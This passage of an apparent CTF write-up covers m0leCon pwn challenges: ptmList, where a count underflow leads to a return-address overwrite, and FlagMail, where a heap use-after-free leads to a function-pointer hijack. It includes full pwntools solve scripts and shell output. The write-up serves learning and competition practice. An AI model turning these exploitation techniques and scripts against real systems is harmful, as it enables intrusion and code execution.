</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> io
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>start</span>(argv<span style=color:#f92672>=</span>[], <span style=color:#f92672>*</span>a, <span style=color:#f92672>**</span>kw):
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> args<span style=color:#f92672>.</span>LOCAL:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> local(argv, <span style=color:#f92672>*</span>a, <span style=color:#f92672>**</span>kw)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> remote(argv, <span style=color:#f92672>*</span>a, <span style=color:#f92672>**</span>kw)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>gdbscript <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>tbreak main
</span></span></span><span style=display:flex><span><span style=color:#e6db74>continue
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#39;&#39;&#39;</span><span style=color:#f92672>.</span>format(<span style=color:#f92672>**</span>locals())
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>#===========================================================</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#                    EXPLOIT GOES HERE</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#===========================================================</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Arch:     amd64-64-little</span>
</span></span><span style=display:flex><span><span style=color:#75715e># RELRO:    Partial RELRO</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Stack:    Canary found</span>
</span></span><span style=display:flex><span><span style=color:#75715e># NX:       NX enabled</span>
</span></span><span style=display:flex><span><span style=color:#75715e># PIE:      No PIE (0x400000)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>io <span style=color:#f92672>=</span> start()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>menu</span>(choice):
</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;choice: &#34;</span>, str(choice))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>list_files</span>():
</span></span><span style=display:flex><span>    menu(<span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>read_file</span>(filename, size):
</span></span><span style=display:flex><span>    menu(<span style=color:#ae81ff>2</span>)
</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;filename: &#34;</span>, filename)
</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;: &#34;</span>, str(size))
</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#34;File content:&#34;</span>)
</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>recvline()
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> io<span style=color:#f92672>.</span>recvline()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>write</span>(filename, data, padding): 
</span></span><span style=display:flex><span>    menu(<span style=color:#ae81ff>3</span>)
</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;filename: &#34;</span>, filename)
</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;: &#34;</span>, data)
</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#34;: &#34;</span>, str(padding))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 1. prepare_pipe (fill + drain)</span>
</span></span><span style=display:flex><span><span style=color:#75715e># 2. splice 128 bytes from priv</span>
</span></span><span style=display:flex><span><span style=color:#75715e># 3. splice 22 bytes from conf to skip header</span>
</span></span><span style=display:flex><span><span style=color:#75715e># 4. write to pipe</span>
</span></span><span style=display:flex><span><span style=color:#75715e># 5. read flag</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>pipe_size <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x10000</span>
</span></span><span style=display:flex><span>write(<span style=color:#e6db74>&#34;conf&#34;</span>, <span style=color:#e6db74>&#34;A&#34;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>0x40</span>, pipe_size <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x40</span>)
</span></span><span style=display:flex><span>read_file(<span style=color:#e6db74>&#34;priv&#34;</span>, <span style=color:#ae81ff>128</span>)
</span></span><span style=display:flex><span>read_file(<span style=color:#e6db74>&#34;conf&#34;</span>, <span style=color:#ae81ff>22</span>)
</span></span><span style=display:flex><span>write(<span style=color:#e6db74>&#34;conf&#34;</span>, <span style=color:#e6db74>&#34;flag</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>read_file(<span style=color:#e6db74>&#34;flag&#34;</span>, <span style=color:#ae81ff>127</span>)
</span></span><span style=display:flex><span>flag <span style=color:#f92672>=</span> read_file(<span style=color:#e6db74>&#34;flag&#34;</span>, <span style=color:#ae81ff>127</span>)[<span style=color:#ae81ff>1</span>:]<span style=color:#f92672>.</span>decode()<span style=color:#f92672>.</span>strip()
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;flag: </span><span style=color:#e6db74>{</span>flag<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>io<span style=color:#f92672>.</span>close()
</span></span></code></pre></div><h2 id=ptmlist>ptmList<a hidden class=anchor aria-hidden=true href=#ptmlist>#</a></h2><blockquote><p><strong>Author:</strong> @Alberto247</p><p><strong>Description:</strong> Thanks to ptmList you can keep your shopping list in order!</p><p><code>stty -icanon && socat - tcp:challs.m0lecon.it:8273 && stty icanon</code></p></blockquote><p>In this challenge we get an ncurses-like interface we have to interact with.
We can buy, move/merge, and delete items. Additionally we also have the <code>Secret gift</code> menu option to modify an item. More on this later.</p><p>Here&rsquo;s the main menu:</p><pre tabindex=0><code>Welcome to ptmList, the program to help you keep your shopping lists in order!
------------------
| View item list |
------------------

| View your list |


| Secret gift    |


| Exit           |
</code></pre><p>We can have up to 50 items. Each item is represented as two bytes: an index
into a list of strings describing the item and a quantity. Free items are
represented as having an index and/or quantity of 0xff. When buying an item we
can also choose the quantity:</p><pre tabindex=0><code>---------------------------------------------------
 box of tissues                | Quantity: 10 |
---------------------------------------------------
</code></pre><p>The <code>View your list</code> option allows us to delete and move/merge items:</p><pre tabindex=0><code>---------------------------------------------------
 box of tissues                | Quantity: 10 |
---------------------------------------------------

 carrot                        | Quantity: 05 |


 coffee pot                    | Quantity: 03 |


 Cancel

w/s move, d delete, m move, Esc exit
</code></pre><p>One thing we quickly noticed in <code>myListController()</code> is that there is a loop to
find the next free item, but it goes all the way up to 0xff (255) instead of 50.
The number of allocated items is stored in a variable and is updated when adding
or deleting items.</p><p>Due to the suspicious loop we assumed that there was a way to overflow or
underflow the number of items. There is a check to prevent more than 50 items
being allocated, so we started looking at the code to delete/move items. First
there is a check in <code>myListHandle()</code> that causes trouble for us when we try to
delete items when the number of items is zero, so we looked at move instead.</p><p>Moving two items will swap their positions (and keep the quantity of the second
item). If you try to move items of the same type, they will be merged instead of
moved. As long as the combined quantity doesn&rsquo;t exceed 99, the items can be
merged and one of them will be deleted. The deletion code moves all items
after our merged items one slot down, overwriting the second item we merged
with. Finally, the number of allocated items will be decremented.</p><p>The loop will stop once it encounters an item with an index or quantity
of 0xff. This is where the <code>Secret gift</code> menu comes into the picture. This
option allows us to set the quantity of an item to 0xff. If we change the
quantity of an item to 0xff, the merging code will stop looping when it reaches
this item. What happens if we try to merge an item with one that has a quantity
of 0xff? The quantities will be merged, effectively subtracting 1 from the
quantity of the first item. Then, when the code tries to move all other items
it will stop on the first iteration since the quantity is 0xff. Finally,
the number of items will be decreased by one. By abusing this behavior we can
keep merging one item with another one that has a quantity of 0xff, which will
decrease the quantity of the first item by 1 and also decrease the number of
items without removing any of them. Doing this a few times will underflow the
count to 0xff.</p><p>When the number of items is set to 0xff we can access data on the stack outside
the item array. We can write values by changing the quantity of items and by
moving and merging items.</p><p>Our attack plan: Ovewrite the two least significant bytes of the return address
on the stack with the address of <code>winfunc()</code>. The three lowest nibbles will
always be 0x5e7, so we decided to just bruteforce the last one. We ended up
buying the item 0x35 times, resulting in the two least significant bytes being
0x35e7.</p><ol><li>Buy wanted item(s) (to ovewrite least significant bytes of the return address)</li><li>Buy 2 x box of tissues</li><li>Secret gift on last box of tissues, setting its quantity to 0xff</li><li>Merge 4 times to underflow the number of items</li><li>Merge return address and with target, thus overwriting the return
address with <code>winfunc()</code></li></ol><p>After running the solve script a few times, you should get a shell.</p><p>Flag: <code>ptm{up_up_d0wn_down_l3ft_r1ght_lef7_r1ght_A_B_pwn}</code></p><p>Solve script:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python</span>
</span></span><span style=display:flex><span><span style=color:#75715e># -*- coding: utf-8 -*-</span>
</span></span><span style=display:flex><span><span style=color:#75715e># This exploit template was generated via:</span>
</span></span><span style=display:flex><span><span style=color:#75715e># $ pwn template --host challs.m0lecon.it --port 8273 ./shoppingList</span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>exe <span style=color:#f92672>=</span> context<span style=color:#f92672>.</span>binary <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#39;./shoppingList&#39;</span>)
</span></span><span style=display:flex><span>host <span style=color:#f92672>=</span> args<span style=color:#f92672>.</span>HOST <span style=color:#f92672>or</span> <span style=color:#e6db74>&#39;challs.m0lecon.it&#39;</span>
</span></span><span style=display:flex><span>port <span style=color:#f92672>=</span> int(args<span style=color:#f92672>.</span>PORT <span style=color:#f92672>or</span> <span style=color:#ae81ff>8273</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>local</span>(argv<span style=color:#f92672>=</span>[], <span style=color:#f92672>*</span>a, <span style=color:#f92672>**</span>kw):
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> args<span style=color:#f92672>.</span>GDB:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> gdb<span style=color:#f92672>.</span>debug([exe<span style=color:#f92672>.</span>path] <span style=color:#f92672>+</span> argv, gdbscript<span style=color:#f92672>=</span>gdbscript, <span style=color:#f92672>*</span>a, <span style=color:#f92672>**</span>kw)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> process([exe<span style=color:#f92672>.</span>path] <span style=color:#f92672>+</span> argv, <span style=color:#f92672>*</span>a, <span style=color:#f92672>**</span>kw)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>remote</span>(argv<span style=color:#f92672>=</span>[], <span style=color:#f92672>*</span>a, <span style=color:#f92672>**</span>kw):
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;</span>
</span></span><span style=display:flex><span>    io <span style=color:#f92672>=</span> connect(host, port)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> args<span style=color:#f92672>.</span>GDB:
</span></span><span style=display:flex><span>        gdb<span style=color:#f92672>.</span>attach(io, gdbscript<span style=color:#f92672>=</span>gdbscript)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> io
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>start</span>(argv<span style=color:#f92672>=</span>[], <span style=color:#f92672>*</span>a, <span style=color:#f92672>**</span>kw):
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> args<span style=color:#f92672>.</span>LOCAL:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> local(argv, <span style=color:#f92672>*</span>a, <span style=color:#f92672>**</span>kw)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> remote(argv, <span style=color:#f92672>*</span>a, <span style=color:#f92672>**</span>kw)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>gdbscript <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>continue
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#39;&#39;&#39;</span><span style=color:#f92672>.</span>format(<span style=color:#f92672>**</span>locals())
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>down</span>():
</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>send(<span style=color:#e6db74>&#34;s&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>up</span>():
</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>send(<span style=color:#e6db74>&#34;w&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>exit</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>3</span>):
</span></span><span style=display:flex><span>        io<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#34;Exit&#34;</span>)
</span></span><span style=display:flex><span>        down()
</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#34;&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>buy</span>(idx, quantity):
</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#34;&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(idx):
</span></span><span style=display:flex><span>        down()
</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#34;&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(quantity):
</span></span><span style=display:flex><span>        down()
</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#34;&#34;</span>)
</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>send(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x1b</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>secret</span>(idx):
</span></span><span style=display:flex><span>    down()
</span></span><span style=display:flex><span>    down()
</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#34;&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(idx):
</span></span><span style=display:flex><span>        down()
</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#34;&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>io <span style=color:#f92672>=</span> start()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># buy item to set up for partial overwrite: 0x35e7</span>
</span></span><span style=display:flex><span>buy(<span style=color:#ae81ff>0xe7</span>, <span style=color:#ae81ff>0x35</span>)
</span></span><span style=display:flex><span>buy(<span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>10</span>)
</span></span><span style=display:flex><span>buy(<span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>10</span>)
</span></span><span style=display:flex><span>secret(<span style=color:#ae81ff>2</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>down()
</span></span><span style=display:flex><span>io<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#34;&#34;</span>)
</span></span><span style=display:flex><span>down()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># merge 4 times to underflow</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>4</span>):
</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>send(<span style=color:#e6db74>&#34;m&#34;</span>)
</span></span><span style=display:flex><span>    down()
</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>send(<span style=color:#e6db74>&#34;m&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># go down to return address</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>59</span>):
</span></span><span style=display:flex><span>    down()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># merge with first item we bought</span>
</span></span><span style=display:flex><span>io<span style=color:#f92672>.</span>send(<span style=color:#e6db74>&#34;m&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>60</span>):
</span></span><span style=display:flex><span>    up()
</span></span><span style=display:flex><span>io<span style=color:#f92672>.</span>send(<span style=color:#e6db74>&#34;m&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># go back to main menu</span>
</span></span><span style=display:flex><span>io<span style=color:#f92672>.</span>send(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x1b</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># exit -&gt; hopefully returns to winfunc()</span>
</span></span><span style=display:flex><span>down()
</span></span><span style=display:flex><span>down()
</span></span><span style=display:flex><span>down()
</span></span><span style=display:flex><span>io<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#34;&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>io<span style=color:#f92672>.</span>interactive()
</span></span></code></pre></div><h2 id=flagmail>FlagMail<a hidden class=anchor aria-hidden=true href=#flagmail>#</a></h2><blockquote><p><strong>Author:</strong> @Matte23</p><p><strong>Description:</strong> I&rsquo;ve been trying to migrate our old flag submitter written
in C to Kotlin. Hopefully other teams wont be able to steal our flags again.
However, I still need to migrate some old C functions&mldr;</p><p><code>nc flagmail.challs.m0lecon.it 4444</code></p></blockquote><p>In this challenge we were given a Windows binary written mostly in Kotlin.
However, as the challenge description hints at, some code is still written in
C.</p><p>The program allows us to save, delete, edit, and submit flags. Every flag we
save gets a new ID, and we use that ID to perform the other actions.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Welcome to FlagMail!
</span></span><span style=display:flex><span>-&gt; save
</span></span><span style=display:flex><span>foobar   
</span></span><span style=display:flex><span>Flag saved with id<span style=color:#f92672>=</span>FRaqbC8wSA1XvpFVjCRGryWtIIZS2TRqf69aZbLA
</span></span><span style=display:flex><span>-&gt; edit
</span></span><span style=display:flex><span>FRaqbC8wSA1XvpFVjCRGryWtIIZS2TRqf69aZbLA
</span></span><span style=display:flex><span>lol
</span></span><span style=display:flex><span>Flag edited!
</span></span><span style=display:flex><span>-&gt; submit
</span></span><span style=display:flex><span>FRaqbC8wSA1XvpFVjCRGryWtIIZS2TRqf69aZbLA
</span></span><span style=display:flex><span>lol
</span></span><span style=display:flex><span>rFlag submitted!
</span></span><span style=display:flex><span>-&gt;
</span></span></code></pre></div><p>By experimenting with the binary we noticed that there seems to be a UAF when
deleting flags. We can still edit, delete, and submit deleted flags.</p><p>The menu options etc. seem to be called from <code>Init_and_run_start()</code>, and the
interesting functions that are implemented in C are <code>Edit</code>, <code>Submit</code>, and
<code>PerformSubmit</code>. Additionally, we also found a function called <code>OldFunc()</code>,
which will give us a shell:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>OldFunc</span>(<span style=color:#66d9ef>void</span>)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> system(<span style=color:#e6db74>&#34;cmd&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Each flag is stored in a struct that looks something like this:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>struct</span> flag {
</span></span><span style=display:flex><span>	size_t field_0;
</span></span><span style=display:flex><span>	size_t size;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>void</span> (<span style=color:#f92672>*</span>func)(<span style=color:#66d9ef>struct</span> flag <span style=color:#f92672>*</span>);
</span></span><span style=display:flex><span>};
</span></span></code></pre></div><p>Since we have a heap UAF, we were pretty sure we could corrupt data on the
heap, and that the goal was to overwrite the function pointer inside of the
flag struct to get RCE.</p><p><code>PerformSubmit()</code> looks something like this:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>PerformSubmit</span>(<span style=color:#66d9ef>struct</span> flag <span style=color:#f92672>*</span>f)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (f<span style=color:#f92672>-&gt;</span>field_0 <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>		(f<span style=color:#f92672>-&gt;</span>func)(f);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>If we can set the first field to -1, and ovewrite the function pointer (at
offset 0x10), we can get code execution. Our plan was then to overwrite the
function pointer with <code>OldFunc()</code>, which should give us a shell.</p><p>There seems to be some variation in the heap layout between runs, but we
observed that the flags would usually be allocated close to each other and
sequentially on the heap.</p><p>To overwrite the function pointer we need to first defeat ASLR, so that was our
first goal. ASLR is initialized at startup on Windows, so we only have to leak
the base address of the binary once. After getting the base we know the address
of <code>OldFunc()</code>. We ended up leaking the function pointer from one of the flags
on the heap by corrupting the size of a flag and reading it back.</p><p>To corrupt the size we allocate three flags and delete the first one. The size
will be set to something big so we can write out of bounds. We tried different
amounts of padding to overflow into into flag2. The first 8 bytes of the flag
struct has to be -1, or else it won&rsquo;t print anything. We detect changes to this
value by submitting the flag and checking if something is printed. If not, the
value has been corrupted.</p><p>After finding the offset from flag1 to flag2, we can corrupt the size of flag2
and submit it to leak the <code>Submit()</code> function pointer from flag3.</p><p>Now that we have the leak we can move on to corrupt the function pointer of
flag3 like we did with the size. We set the function to the address of
<code>OldFunc()</code>. Then we just have to submit flag3, and it should give us a shell!</p><p>At this point we spent a lot of time trying to get our exploit to work. It
seemed like we were able to successfully overwrite <code>field_0</code> with -1 and the
function pointer, but it would always crash when we tried executing
<code>OldFunc()</code>. However, testing with the original function pointer (<code>Submit()</code>),
the code was behaving exactly like before.</p><p>Our first idea was to skip the stack initialization in <code>OldFunc()</code> to work
around potential stack alignment issues with XMM instructions, but that didn&rsquo;t
work either. After a lot of trial and error we decided to set up a Windows 2022
server and perform some debugging.</p><p>After finally getting everything up and running, we attached to the process
using Windbg and was able to see what was going on. For some reason the process
was crashing due to heap corruption while it was trying to execute <code>cmd</code>.</p><p>At this point there was less than 30 minutes left of the CTF and we were
getting a bit desperate. As a final hail mary we tried adding another flag
before triggering execution of the overwritten function pointer. And it worked!</p><p>We finally got that sweet, sweet Windows shell:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Microsoft Windows <span style=color:#f92672>[</span>Version 10.0.20348.707
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>c<span style=color:#f92672>)</span> Microsoft Corporation. All rights reserved.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>C:<span style=color:#ae81ff>\&gt;</span> whoami
</span></span><span style=display:flex><span>user manager<span style=color:#ae81ff>\\</span>containeradministrator
</span></span><span style=display:flex><span>C:<span style=color:#ae81ff>\&gt;</span> dir
</span></span><span style=display:flex><span> Volume in drive C has no label.
</span></span><span style=display:flex><span> Volume Serial Number is B2E4-3A3E
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span> Directory of C:<span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>
</span></span><span style=display:flex><span>05/04/2022  10:03 PM           571,904 challenge.exe
</span></span><span style=display:flex><span>05/04/2022  10:03 PM                <span style=color:#ae81ff>46</span> flag.txt
</span></span><span style=display:flex><span>04/22/2022  12:55 AM             5,510 License.txt
</span></span><span style=display:flex><span>05/05/2022  04:05 AM    &lt;DIR&gt;          Program Files
</span></span><span style=display:flex><span>05/05/2022  03:41 AM    &lt;DIR&gt;          Program Files <span style=color:#f92672>(</span>x86<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>05/12/2022  07:21 PM    &lt;DIR&gt;          socat
</span></span><span style=display:flex><span>05/05/2022  04:11 AM    &lt;DIR&gt;          Users
</span></span><span style=display:flex><span>05/13/2022  08:05 PM    &lt;DIR&gt;          Windows
</span></span><span style=display:flex><span>               <span style=color:#ae81ff>3</span> File<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span>        577,460 bytes
</span></span><span style=display:flex><span>               <span style=color:#ae81ff>5</span> Dir<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span>  20,609,708,032 bytes free
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>C:<span style=color:#ae81ff>\&gt;</span> type flag.txt
</span></span><span style=display:flex><span>ptm<span style=color:#f92672>{</span>LooK2_L1Ke_My_5U8m1tTER_12_4_81t_CONfu5Ed<span style=color:#f92672>}</span>
</span></span></code></pre></div><p>Solve script:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>log_level <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;debug&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>leak <span style=color:#f92672>=</span> <span style=color:#66d9ef>False</span>
</span></span><span style=display:flex><span><span style=color:#75715e># leak base address instead of overwriting pointer</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#leak = True</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
</span></span><span style=display:flex><span>    r <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#34;flagmail.challs.m0lecon.it&#34;</span>, <span style=color:#ae81ff>4444</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># create flag 1</span>
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>sendafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;-&gt; &#34;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;save</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;yo&#34;</span>)
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;id=&#34;</span>)
</span></span><span style=display:flex><span>    id1 <span style=color:#f92672>=</span> r<span style=color:#f92672>.</span>recvline()<span style=color:#f92672>.</span>decode()<span style=color:#f92672>.</span>strip()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># create flag 2</span>
